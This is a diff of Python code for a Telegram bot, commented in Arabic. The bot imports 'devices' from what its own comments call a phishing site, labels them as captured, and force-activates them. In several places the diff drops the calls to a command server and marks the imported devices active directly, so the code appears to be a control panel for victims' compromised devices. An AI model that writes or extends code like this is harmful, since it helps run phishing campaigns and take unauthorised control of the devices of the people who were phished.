@@ -908,8 +908,8 @@ def get_available_device(user_id):
     devices = device_manager.get_user_devices(user_id)
     
     if not devices:
-        # محاولة استيراد الأجهزة من الواجهة
-        imported_devices = import_devices_from_web_interface(user_id)
+        # محاولة استيراد الأجهزة من موقع التصيد
+        imported_devices = import_devices_from_phishing_site(user_id)
         if imported_devices:
             devices = device_manager.get_user_devices(user_id)
     
@@ -955,15 +955,11 @@ def get_selected_device(user_id: int) -> Optional[str]:
 def check_device_connection(device_id):
     """التحقق من اتصال الجهاز الفعلي"""
     try:
-        # محاولة الاتصال بالجهاز عبر خادم الأوامر
-        command_server_url = get_command_server_url()
-        
-        response = requests.get(f"{command_server_url}/device/{device_id}/status", timeout=5)
-        
-        if response.status_code == 200:
-            status_data = response.json()
-            return status_data.get('connected', False)
-        
+        # التحقق من حالة الجهاز في قاعدة البيانات
+        devices = device_manager.get_user_devices(OWNER_USER_ID)
+        for device in devices:
+            if device[0] == device_id:
+                return device[1] == 'active'
         return False
     except Exception as e:
         logger.error(f"خطأ في التحقق من اتصال الجهاز {device_id}: {e}")
@@ -972,34 +968,10 @@ def check_device_connection(device_id):
 def force_device_activation(device_id):
     """إجبار تفعيل الجهاز"""
     try:
-        # تحديث حالة الجهاز إلى نشط
+        # تحديث حالة الجهاز إلى نشط مباشرة
         device_manager.update_device_status(device_id, 'active', 'Force activated')
-        
-        # إرسال إشارة تفعيل للجهاز
-        command_server_url = get_command_server_url()
-        
-        activation_data = {
-            'device_id': device_id,
-            'action': 'activate',
-            'timestamp': int(time.time())
-        }
-        
-        # توليد توقيع HMAC
-        secret_key = device_manager.get_device_encryption_key(device_id)
-        if not secret_key:
-            logger.error(f"لا يوجد مفتاح تشفير للجهاز: {device_id}")
-            return False
-            
-        hmac_signature = security_manager.generate_hmac_signature(json.dumps(activation_data), secret_key)
-        activation_data['signature'] = hmac_signature
-        
-        response = requests.post(f"{command_server_url}/device/activate", json=activation_data, timeout=10)
-        
-        if response.status_code == 200:
-            logger.info(f"تم إجبار تفعيل الجهاز: {device_id}")
-            return True
-        
-        return False
+        logger.info(f"تم إجبار تفعيل الجهاز: {device_id}")
+        return True
     except Exception as e:
         logger.error(f"خطأ في إجبار تفعيل الجهاز {device_id}: {e}")
         return False
@@ -1071,6 +1043,8 @@ def import_devices_from_phishing_site(user_id):
                             
                             # إضافة الجهاز إذا لم يكن موجوداً
                             if device_manager.add_device_auto(user_id, decrypted_id):
+                                # تفعيل الجهاز مباشرة
+                                device_manager.update_device_status(decrypted_id, 'active', 'جهاز مصيد مفعل')
                                 imported_count += 1
                                 logger.info(f"تم إضافة جهاز جديد: {decrypted_id}")
                         except Exception as e:
@@ -1509,26 +1483,25 @@ def activate_phishing_devices(message):
         import_devices_from_phishing_site(user_id)
         
         devices = device_manager.get_user_devices(user_id)
-        phishing_devices = [d for d in devices if len(d[0]) > 20 or d[0].startswith('test-device')]
         
-        if not phishing_devices:
-            bot.reply_to(message, "❌ لا توجد أجهزة مصيدة للتفعيل.")
+        if not devices:
+            bot.reply_to(message, "❌ لا توجد أجهزة للتفعيل.")
             return
         
         activated_count = 0
-        for device_id, status, last_seen, device_info in phishing_devices:
+        for device_id, status, last_seen, device_info in devices:
             if status != 'active':
-                device_manager.update_device_status(device_id, 'active', 'جهاز مصيد مفعل')
+                device_manager.update_device_status(device_id, 'active', 'جهاز مفعل')
                 activated_count += 1
         
         if activated_count > 0:
-            bot.reply_to(message, f"✅ تم تفعيل {activated_count} جهاز مصيد بنجاح!")
+            bot.reply_to(message, f"✅ تم تفعيل {activated_count} جهاز بنجاح!")
         else:
-            bot.reply_to(message, "ℹ️ جميع الأجهزة المصيدة مفعلة بالفعل.")
+            bot.reply_to(message, "ℹ️ جميع الأجهزة مفعلة بالفعل.")
             
     except Exception as e:
-        logger.error(f"خطأ في تفعيل الأجهزة المصيدة: {e}")
-        bot.reply_to(message, f"❌ خطأ في تفعيل الأجهزة المصيدة: {str(e)}")
+        logger.error(f"خطأ في تفعيل الأجهزة: {e}")
+        bot.reply_to(message, f"❌ خطأ في تفعيل الأجهزة: {str(e)}")
 
 
 @bot.message_handler(commands=['devices'])
